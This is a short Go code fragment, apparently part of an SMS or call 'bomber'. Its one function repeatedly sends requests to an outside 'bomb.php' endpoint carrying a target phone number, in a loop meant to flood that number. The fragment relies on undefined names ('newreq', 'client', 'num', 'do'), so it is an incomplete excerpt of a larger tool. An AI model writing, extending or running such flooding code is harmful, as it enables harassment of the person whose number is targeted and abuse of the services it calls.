package main

func greadios() {
	req := newreq()
	req.SetRequestURI("http://greadios.beget.tech/bomb.php?number=" + num)

	for do {
		client.Do(req, nil)
	}
}
